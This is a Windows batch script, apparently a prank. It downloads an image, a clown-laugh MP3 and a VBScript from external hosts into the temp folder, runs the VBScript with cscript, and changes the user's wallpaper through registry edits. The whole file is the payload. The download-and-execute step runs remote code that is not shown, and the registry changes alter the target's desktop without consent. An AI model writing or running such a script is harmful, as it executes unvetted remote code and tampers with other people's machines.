@echo off
powershell -Command "Invoke-WebRequest http://art-exlibris.net/images/large/exlibris_21693.jpg -OutFile %temp%\hatter.jpg"
timeout 1
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FearOffTheFart/Bash/master/clownlaugh.mp3 -OutFile %temp%\haha.mp3"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FGabi01/BashHacks/master/player.vbs -OutFile %temp%\player.vbs"
cscript %temp%\player.vbs
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /f /d %temp%\hatter.jpg
reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
rundll32.exe user32.dll, UpdatePerUserSystemParameters
timeout 3
exit

